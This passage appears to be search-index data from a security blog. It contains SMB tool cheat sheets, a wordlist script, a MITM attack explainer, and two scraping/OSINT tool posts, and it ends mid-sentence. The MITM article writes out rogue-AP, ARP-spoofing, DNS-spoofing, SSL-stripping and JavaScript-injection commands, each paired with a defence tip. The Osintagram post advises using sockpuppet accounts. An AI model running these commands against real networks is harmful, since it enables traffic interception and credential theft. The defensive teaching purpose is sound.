\u0026lt;files\u0026gt;: Download multiple files. rm \u0026lt;file\u0026gt;: Delete a file. mkdir \u0026lt;directory\u0026gt;: Create a new directory. rmdir \u0026lt;directory\u0026gt;: Remove a directory. exit: Disconnect from the share and exit smbclient. Examples List Files in a Share smbclient //server/share -c ls Connect with a Specific Username and Password smbclient //server/share -U username%password Connect Using an IP Address and Port smbclient //server/share -I 192.168.1.100 -p 139 Upload a File smbclient //server/share -c \u0026#34;put /path/to/local/file\u0026#34; Download a File smbclient //server/share -c \u0026#34;get /path/to/remote/file\u0026#34; Create a New Directory smbclient //server/share -c \u0026#34;mkdir newdirectory\u0026#34; When to Use smbclient Quick Access: Need to interact with a file share without mounting it? smbclient gives you immediate access. Testing Permissions: Check which directories and files are accessible under different credentials. File Operations: Download, upload, or manage files on SMB shares. Debugging: Troubleshoot network shares with verbose output using -d. ","permalink":"http://localhost:1313/cheat-sheets/smbclient/","summary":"\u003cp\u003e\u003cstrong\u003esmbclient\u003c/strong\u003e is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\u003c/p\u003e\n\u003ch2 id=\"basic-usage\"\u003eBasic Usage\u003c/h2\u003e\n\u003cp\u003eTo connect to an SMB file share, use the following syntax:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbclient //server/share \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eserver\u003c/code\u003e\u003c/strong\u003e with the hostname or IP address of the server hosting the file share.\u003c/li\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eshare\u003c/code\u003e\u003c/strong\u003e with the name of the file share.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOnce connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\u003c/p\u003e","title":"smbclient"},{"content":"SMBMap is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\nBasic Syntax smbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; [options] Common Usage Examples Connect with Null Password smbmap -u guest -p \u0026#34;\u0026#34; -d . -H 192.168.1.1 Connect as Admin with Password smbmap -u admin -p password123 -d . -H 192.168.1.1 Execute a Command smbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u0026#39;ipconfig\u0026#39; Connect to a Specific Drive smbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u0026#39;C$\u0026#39; Upload a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u0026#39;/path/to/file.txt\u0026#39; \u0026#39;C$\\file.txt\u0026#39; Download a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u0026#39;C$\\file.txt\u0026#39; Enumerate a Specific Share smbmap -H 192.168.1.1 -s \u0026#39;share_name\u0026#39; Enumerate Users smbmap -H 192.168.1.1 --users Key Options -u \u0026lt;username\u0026gt;: Specify the username. -p \u0026lt;password\u0026gt;: Specify the password. -H \u0026lt;host\u0026gt;: Specify the target host. -r \u0026lt;share\u0026gt;: Connect to a specific share or drive. -x \u0026lt;command\u0026gt;: Execute a command on the target. --upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;: Upload a file to the target. --download \u0026lt;remote_file\u0026gt;: Download a file from the target. -s \u0026lt;share\u0026gt;: Enumerate a specific share. --users: Enumerate users on the target. -R: Check for shares with full permissions. -p \u0026lt;port\u0026gt;: Specify a port. When to Use SMBMap Permission Audits: Quickly identify shares with read, write, or full access permissions. Command Execution: Execute remote commands on accessible shares. File Transfers: Upload or download files directly from SMB shares. User Enumeration: Discover user accounts configured on the target system. Final Thoughts SMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\n","permalink":"http://localhost:1313/cheat-sheets/smbmap/","summary":"\u003cp\u003e\u003cstrong\u003eSMBMap\u003c/strong\u003e is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-usage-examples\"\u003eCommon Usage Examples\u003c/h2\u003e\n\u003ch3 id=\"connect-with-null-password\"\u003eConnect with Null Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u guest -p \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-as-admin-with-password\"\u003eConnect as Admin with Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"execute-a-command\"\u003eExecute a Command\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ipconfig\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-to-a-specific-drive\"\u003eConnect to a Specific Drive\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"upload-a-file\"\u003eUpload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/path/to/file.txt\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"download-a-file\"\u003eDownload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-a-specific-share\"\u003eEnumerate a Specific Share\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 -s \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;share_name\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-users\"\u003eEnumerate Users\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 --users\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"key-options\"\u003eKey Options\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the username.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-H \u0026lt;host\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target host.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Connect to a specific share or drive.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-x \u0026lt;command\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Execute a command on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Upload a file to the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--download \u0026lt;remote_file\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Download a file from the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Enumerate a specific share.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--users\u003c/code\u003e\u003c/strong\u003e: Enumerate users on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Check for shares with full permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;port\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a port.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"when-to-use-smbmap\"\u003eWhen to Use SMBMap\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePermission Audits\u003c/strong\u003e: Quickly identify shares with read, write, or full access permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommand Execution\u003c/strong\u003e: Execute remote commands on accessible shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFile Transfers\u003c/strong\u003e: Upload or download files directly from SMB shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUser Enumeration\u003c/strong\u003e: Discover user accounts configured on the target system.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eSMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\u003c/p\u003e","title":"SMBMap"},{"content":"Sometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this Wordlist Generator comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\nWhy Bash? You might be asking, why Bash? Well, there’s beauty in simplicity. This script was created to strip down the task to its essentials: no dependencies, no extra fuss, just the native power of Bash. While there are plenty of tools out there for generating wordlists, this one leans into the Unix philosophy—do one thing, and do it well.\nHow It Works The script takes one or more text files as input, extracts the words, normalizes them to lowercase, removes duplicates, sorts them, and outputs everything into a file called wordlist.txt. The end result? A clean, ordered list of unique words ready for your next project.\nKey Features Simple Input: Accepts multiple text files as input. Automatic Sorting: Ensures the wordlist is alphabetically ordered. No Dependencies: Works out of the box with any modern Bash shell. Efficiency: Processes files with a single command pipeline. Getting Started Installation Just grab the script at the bottom of this page, make it executable, and you’re good to go. Or you can get it on my github :\ngit clone https://github.com/noobosaurus-r3x/Wordlister cd Wordlister chmod +x wordlister.sh Usage The script is designed to be intuitive and easy to use. Here’s the basic syntax:\n./wordlister.sh file1.txt file2.txt file3.txt What It Does Combines the contents of all provided text files. Extracts words by splitting on non-alphanumeric characters. Converts all words to lowercase to avoid duplicates like Word and word. Removes duplicates entirely. Outputs the results into wordlist.txt in the current directory. Example Imagine you have two text files, file1.txt and file2.txt, and you want to generate a wordlist:\nRun the script:\n./wordlister.sh file1.txt file2.txt The script processes the files and outputs:\nCreated wordlist with 500 words Open wordlist.txt to see your results.\nNotes If no files are provided, the script will display a usage message and exit. The output file is overwritten each time the script runs, so be sure to back up your previous wordlists if needed. The Script For those who want a peek under the hood, here’s the full script:\n#!/usr/bin/env bash set -euo pipefail IFS=$\u0026#39;\\n\\t\u0026#39; if [ $# -eq 0 ]; then echo \u0026#34;Usage: $0 \u0026lt;text_file1\u0026gt; [\u0026lt;text_file2\u0026gt; ...]\u0026#34; exit 1 fi wordlist=\u0026#34;wordlist.txt\u0026#34; # Process input files to extract unique words in lowercase LC_ALL=C cat \u0026#34;$@\u0026#34; \\ | tr -c \u0026#39;[:alnum:]\u0026#39; \u0026#39;\\n\u0026#39; \\ | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; \\ | sort -u \u0026gt; \u0026#34;$wordlist\u0026#34; word_count=$(wc -l \u0026lt; \u0026#34;$wordlist\u0026#34;) echo \u0026#34;Created wordlist with $word_count words\u0026#34; Why Use This Script? If you need a no-nonsense way to generate a wordlist, this script has you covered. It’s lightweight, fast, and doesn’t require any external tools or libraries. Whether you’re working in cybersecurity, natural language processing, or simply organizing your text data, this Bash script is a reliable companion.\nFinal Thoughts Sometimes the simplest tools are the most effective. This wordlist generator isn’t trying to be fancy; it’s just trying to do the job—and it does it well. If you’ve got improvements or ideas, feel free to tweak the script to fit your needs. After all, the best tools are the ones you make your own.\n","permalink":"http://localhost:1313/tools/wordlister/","summary":"\u003cp\u003eSometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this \u003cstrong\u003eWordlist Generator\u003c/strong\u003e comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\u003c/p\u003e","title":"Wordlister"},{"content":"MITM Attacks: How to Crash the Party Between Alice and Bob Man-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, “Don’t mind me.” Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes tweaking what’s being said.\nToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\nWhat Even Is a Man-in-the-Middle Attack? Picture this: Alice and Bob are exchanging secrets—love letters, memes, bank details, or maybe just complaining about Carol. They think they’re communicating directly, but little do they know, Carol is sitting in the middle, reading every word, tweaking the conversation, and cackling like a villain in a bad spy movie.\nIn the digital world, Alice could be your laptop, Bob a website or server, and Carol a hacker lurking on your café’s Wi-Fi or corporate network. She intercepts traffic, decrypts it (sometimes), and messes with it however she pleases.\nThe terrifying part? This can happen to you without you realizing it—until it’s too late.\nHow Carol Crashes the Party: Common MITM Tricks Carol’s bag of tricks is stuffed with clever (and sometimes shockingly simple) ways to hijack your traffic. Here’s how she pulls it off:\n1. Rogue Wi-Fi Access Points: Carol’s Favorite Honeytrap Setting up a rogue Wi-Fi access point doesn’t require much more than a laptop, a coffee shop corner, and a catchy SSID like Free_Cafe_WiFi or Starbux_Free. You think you’re connecting to free Wi-Fi for your overpriced latte, but you’re actually walking straight into Carol’s trap.\nHow It Works (The Tech Bit): Broadcast the Trap: Carol uses tools like Airbase-ng to create a fake access point. airbase-ng -e \u0026#34;Starbux_Guest\u0026#34; -c 6 wlan0mon Monitor the Victims: Your device connects, trusting the familiar name. Carol now acts as the gateway to the internet. Proxy the Traffic: With tools like ettercap or mitmproxy, Carol routes all your traffic through her machine. She can sniff, modify, or inject malware at will. bettercap -T -q -M arp:remote // // -i wlan0 Optional Evil Fun: Carol can inject JavaScript keyloggers, replace downloads with malware, or redirect DNS queries to phishing pages. Why It’s Effective Devices love auto-connecting to networks they recognize, and humans… well, we love free Wi-Fi.\nDefense Tip: Always use a VPN. It wraps your data in encryption, making Carol’s snooping session as useful as watching a scrambled TV channel from the 90s.\n2. ARP Spoofing: “Hi, I’m the Router Now” ARP (Address Resolution Protocol) is like the phonebook for local networks, mapping IP addresses to MAC addresses. But ARP has a fatal flaw: it trusts everyone. Carol exploits this blind trust to impersonate the router and redirect all traffic through herself.\nHow It Works: Carol tells the router: “Hey, I’m Alice.” Carol tells Alice: “Hey, I’m the router.” Traffic meant for Alice or the router now flows through Carol. arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1 Why It’s Effective On a LAN, ARP spoofing is lightning-fast and stealthy. Carol can:\nSniff unencrypted traffic with Wireshark. Modify requests in real time. Drop packets because chaos is fun. The Tell: On compromised machines, running arp -a often exposes duplicate MAC addresses—a sign Carol’s in the mix.\nDefense Tip: Use ARP detection tools like Arpwatch or enable Dynamic ARP Inspection (DAI) on managed switches.\n3. DNS Spoofing: Carol’s Redirection Magic You type bank.com into your browser. Carol decides that’s cute and redirects you to fak3bank.com—a malicious clone where she harvests your login details.\nHow It Works: Carol intercepts DNS requests (via tools like tcpdump): tcpdump -i eth0 udp port 53 She injects a fake DNS response faster than the real DNS server: dnsspoof -i eth0 -f dns_hosts Example dns_hosts file: 133.7.133.7 google.com You land on Carol’s server, which looks real enough for you to log in like a good, oblivious citizen. Defense Tip: Use DNSSEC to validate DNS responses and encrypt queries with DNS-over-HTTPS (DoH).\n4. SSL Stripping: Downgrading You Back to 2005 You know HTTPS—the comforting padlock in your browser bar? Carol strips it away like a magician revealing a trapdoor.\nHow It Works: You type https://example.com. Carol intercepts and strips the HTTPS headers, forcing a plain old HTTP connection. Everything—passwords, credit card info, embarrassing searches—travels unencrypted. bettercap -iface eth0 -caplet https-ui Carol logs it all. The tiny missing s in HTTPS becomes the gateway to your digital life.\nDefense Tip: Use HSTS (HTTP Strict Transport Security) and browser extensions like HTTPS Everywhere to force secure connections.\n5. HTTPS Spoofing: Fake Certificates, Real Problems If SSL stripping is a blunt hammer, HTTPS spoofing is a precision scalpel. Carol doesn’t remove encryption—she fakes it.\nHow It Works: Carol generates a self-signed SSL certificate to impersonate a legitimate server: openssl req -new -x509 -keyout fakekey.pem -out fakecert.pem She intercepts the connection, swapping the real SSL cert for her fake one. Your browser thinks it’s secure (padlock and all), and Carol decrypts everything. Why It Works Most people trust the padlock icon without ever inspecting the certificate details.\nDefense Tip: Use certificate pinning to reject impostor certificates and manually verify SSL certificates for sensitive services.\nMITM Isn’t Just Eavesdropping—It’s Total Manipulation MITM doesn’t stop at listening. Carol can inject malware, redirect you to phishing sites, or swap out legitimate downloads with compromised files. She can even inject JavaScript into HTTP traffic to keylog everything you type. Tools like Bettercap make this child’s play:\nbettercap -iface eth0 -caplet js-inject Final Thoughts: How to Keep Carol Out MITM attacks exploit trust—trust in open networks, unverified certificates, or unsecured protocols. But with a few defenses, you can kick Carol out of the party:\nAlways use a VPN on public networks. Enable HSTS, DNSSEC, and encrypted DNS (DoH/DoT). Inspect SSL certificates, especially on critical services. Watch for anomalies: duplicate MAC addresses, suspicious DNS redirects, or missing HTTPS. In short: trust no one, especially not the Wi-Fi named Free_Cafe_WiFi. Carol’s out there, latte in hand, waiting for you to slip up. Don’t give her the satisfaction.\n","permalink":"http://localhost:1313/articles/mitm_crash_a_party/","summary":"\u003ch1 id=\"mitm-attacks-how-to-crash-the-party-between-alice-and-bob\"\u003e\u003cstrong\u003eMITM Attacks: How to Crash the Party Between Alice and Bob\u003c/strong\u003e\u003c/h1\u003e\n\u003cp\u003eMan-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, \u003cem\u003e“Don’t mind me.”\u003c/em\u003e Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes \u003cem\u003etweaking\u003c/em\u003e what’s being said.\u003c/p\u003e\n\u003cp\u003eToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\u003c/p\u003e","title":"MITM Attacks"},{"content":"InspecTor: A Streamlined Tool for Website Metadata Extraction Pulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\nTo clarify, I’m not a professional developer, just someone who needed a functional solution when existing tools fell short. Most scrapers I tried either broke on .onion domains or failed to process JavaScript-heavy pages. I created InspecTor to extract emails, links, images, and other relevant data without exposing my IP address. While it’s not perfect, it works and might save you some headaches too.\nWhat Makes InspecTor Stand Out? InspecTor focuses on three core capabilities:\nMetadata Extraction: It retrieves emails, phone numbers, links, images, and other exposed data from websites. Tor Support: Requests are routed through the Tor network, enabling anonymous access to .onion domains and privacy-sensitive sites. Dynamic Content Handling: By leveraging Selenium, InspecTor processes JavaScript-heavy pages that traditional scrapers typically ignore. Combined with multithreading for concurrent URL processing, InspecTor offers an efficient way to gather metadata while avoiding flags or blocks.\nKey Features Anonymous Scraping: Routes all requests through the Tor network for IP anonymity and seamless .onion domain access. Dynamic Content Support: Processes JavaScript-dependent pages using Selenium. Targeted Metadata Extraction: Retrieve specific fields like emails, phone numbers, images, and links. Concurrent Processing: Multithreading allows simultaneous scraping of multiple URLs for improved speed. Flexible Output Formats: Export results to JSON, SQLite, or human-readable formats. Configurable Options: Adjust threading, output fields, SSL verification, and more. Setting Up InspecTor 1. Clone the Repository git clone https://github.com/noobosaurus-r3x/InspecTor.git cd InspecTor 2. Install Dependencies pip install -r requirements.txt 3. Install Tor Ensure Tor is installed and running to route requests.\nsudo apt update sudo apt install tor sudo systemctl start tor 4. Set Up Selenium (Optional for Dynamic Content) Install Chrome and ChromeDriver. Ensure ChromeDriver matches your browser version.\nUsing InspecTor Extract Metadata from Specific URLs Provide single or multiple URLs:\npython3 InspecTor.py -u https://example.com https://example.onion Process a File of URLs Input a list of targets from a file:\npython3 InspecTor.py -f urls.txt Force Tor for All Traffic Route all requests through Tor, even for non-.onion domains:\npython3 InspecTor.py -u https://example.com --force-tor Save Results to JSON or SQLite Export metadata to a file or database:\npython3 InspecTor.py -u https://example.onion -o metadata.json python3 InspecTor.py -u https://example.onion --database metadata.db Extract Specific Fields Focus on targeted data:\npython3 InspecTor.py -u https://example.onion --fields emails links -o contact_info.json Handle JavaScript Content Enable Selenium for scraping JavaScript-dependent pages:\npython3 InspecTor.py -u https://example.onion --use-selenium Example Commands Extract everything: python3 InspecTor.py -u https://example.onion --extract-all -o all_metadata.json Grab emails and phone numbers: python3 InspecTor.py -u https://example.com --fields emails phone_numbers -o contact_info.json Ignore SSL certificate issues: python3 InspecTor.py -u https://example.onion --no-verify-ssl --human-readable Output Formats JSON: Structured file output for further processing. SQLite: Database storage for querying and analysis. Human-Readable: Clean, formatted text output for quick reviews. Notes on Tor and Dynamic Content Tor Requirements: Tor must be running on 127.0.0.1:9050. Selenium Setup: Ensure Chrome and ChromeDriver versions match for dynamic content scraping. SSL Verification: Enabled by default; use --no-verify-ssl to bypass invalid certificates. Threading: Control parallel processing with --max-workers for faster scraping. Why I Built InspecTor InspecTor was born out of necessity. Existing tools often fell short when handling .onion domains or JavaScript-heavy pages. As someone who needed a simple and effective way to extract metadata for OSINT investigations, website audits, and cybersecurity research, I created InspecTor.\nIt’s not perfect, but it works. If it helps you solve a problem, that’s great. If you find ways to improve it, even better.\n\u0026ndash;\n","permalink":"http://localhost:1313/tools/inspector/","summary":"\u003ch2 id=\"inspector-a-streamlined-tool-for-website-metadata-extraction\"\u003eInspecTor: A Streamlined Tool for Website Metadata Extraction\u003c/h2\u003e\n\u003cp\u003ePulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\u003c/p\u003e","title":"InspecTor"},{"content":"Gathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where Osintagram comes in: a simple script I put together to finally get Instagram OSINT working again.\nI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\nWhy Osintagram? If you’ve ever tried to scrape data from Instagram, you’ve probably hit limitations like expired session cookies or blocked API calls. Osintagram addresses these issues by:\nUsing Session Cookies: It requires an Instagram session cookie (sockpuppet accounts recommended). This lets you sidestep some of the traditional hurdles of accessing data. Focusing on Practical OSINT: Instead of bloated features, Osintagram keeps it simple and effective—fetching user data like followers, bio, posts, and more. Actually Working: Unlike older tools that throw errors with Instagram’s new API, this one is tested against modern challenges. Features Profile Information Retrieval: Extract usernames, full names, follower and following counts, posts, biographies, and even external website links. Identify whether the account is private or verified. Secure Session Management: Stores session cookies securely using encryption. Straightforward Command-Line Interface: Easy-to-use commands for data extraction. Randomized User Agents: Mimics browser requests to avoid detection. Setting It Up Installation Clone the repository: git clone https://github.com/noobosaurus-r3x/osintagram.git cd osintagram Install dependencies: pip3 install -r requirements.txt Initial Configuration Osintagram relies on an Instagram session ID. During the setup, you’ll provide this ID (from a browser cookie), and the tool will encrypt and store it securely. Use a sockpuppet account to avoid risks.\nRun the setup command:\npython3 osintagram.py --setup This generates two files:\nconfig.ini: Stores encrypted credentials. secret.key: The encryption key for decrypting session IDs. Now you’re ready to dive into OSINT.\nUsing Osintagram To fetch information about a specific Instagram user, run:\npython3 osintagram.py -u \u0026lt;target_username\u0026gt; Replace \u0026lt;target_username\u0026gt; with the Instagram handle you’re interested in. The tool will return:\nProfile stats (followers, following, posts). Account details (bio, verification status, links). The Tech Behind the Tool Osintagram’s architecture is straightforward but effective:\nSession Management: Handles login sessions securely using encrypted cookies. Randomized User Agents: Rotates user agents to simulate real browser activity. Output Handling: Formats fetched data for clarity using rich for visually appealing results. Key Scripts osintagram.py: The main script that orchestrates everything. setup.py: Encrypts and stores session cookies during the initial setup. instagram_api_handler.py: Handles API interactions to fetch profile data. output_manager.py: Manages formatting and presenting results. encryption_utils.py: Encrypts and decrypts session credentials. user_agent_manager.py: Generates randomized user agents. Limitations and Ethical Considerations Limitations: Requires manual extraction of session cookies. Cannot bypass Instagram’s rate limits or restrictions. Ethical Use: Only use this tool on accounts you have permission to analyze. Misuse of OSINT tools can lead to legal consequences. Credits Osintagram is inspired by Toutatis by Palenath. Huge thanks to 